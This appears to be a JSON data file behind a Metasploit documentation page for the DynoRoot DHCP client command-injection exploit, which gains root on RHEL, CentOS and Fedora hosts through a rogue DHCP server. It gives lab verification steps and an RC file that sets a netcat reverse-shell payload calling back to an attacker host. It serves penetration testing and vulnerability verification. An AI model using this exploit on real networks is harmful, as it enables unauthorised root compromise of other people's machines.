{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/dhcp/rhel_dhcp_client_command_injection","result":{"data":{"moduleMetadataJson":{"id":"983babdb-1b6e-5f19-8d01-7f48e342c6ee","name":"DHCP Client Command Injection (DynoRoot)","fullname":"exploit/unix/dhcp/rhel_dhcp_client_command_injection","description":"This module exploits the DynoRoot vulnerability, a flaw in how the\n         NetworkManager integration script included in the DHCP client in\n         Red Hat Enterprise Linux 6 and 7, Fedora 28, and earlier\n         processes DHCP options. A malicious DHCP server, or an attacker on\n         the local network able to spoof DHCP responses, could use this flaw\n         to execute arbitrary commands with root privileges on systems using\n         NetworkManager and configured to obtain network configuration using\n         the DHCP protocol.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/unix/dhcp/rhel_dhcp_client_command_injection","documentationSlug":"/modules/documentation/exploit/unix/dhcp/rhel_dhcp_client_command_injection"},"documentation":{"html":"<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ul>\n<li>Setup CentOS virtual machine and Kali virtual machine</li>\n<li>Ensure proper versions are in use. This was tested on <code class=\"language-text\">CentOS Linux release 7.4.1708 (Core)</code> with NetworkManager version <code class=\"language-text\">1.8.0-11.el7_4</code></li>\n<li>Create isolated custom network (e.g. 192.168.41.0/24)</li>\n<li>Disable DHCP server on custom network for easier verification </li>\n<li>Start <code class=\"language-text\">msfconsole</code> on Kali Linux</li>\n<li><code class=\"language-text\">use exploit/unix/dhcp/rhel_dhcp_client_command_injection</code></li>\n<li>Configure <code class=\"language-text\">SRVHOST</code> and <code class=\"language-text\">NETMASK</code> required variables</li>\n<li>Configure <code class=\"language-text\">PAYLOAD</code> and supporting options</li>\n<li>Start the DHCP server</li>\n<li>On CentOS 7 machine, request a new DHCP address. Assuming primary interface is <code class=\"language-text\">ens33</code>, you can use: <code class=\"language-text\">clear &amp;&amp; nmcli conn down id &quot;ens33&quot; &amp;&amp; nmcli conn up id &quot;ens33&quot; &amp;&amp; ip addr show</code></li>\n<li>This should request a new DHCP from your server (if other DHCP servers exist, note that then this becomes a race condition often requiring DHCP NAK's to get your DHCP to win)</li>\n</ul>\n<p>Validated using RC File:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">use exploit/unix/dhcp/rhel_dhcp_client_command_injection\nset SRVHOST 192.168.41.129\nset NETMASK 255.255.255.0\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST 192.168.41.2\nset LPORT 1337\nexploit -j -z</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"983babdb-1b6e-5f19-8d01-7f48e342c6ee"}}}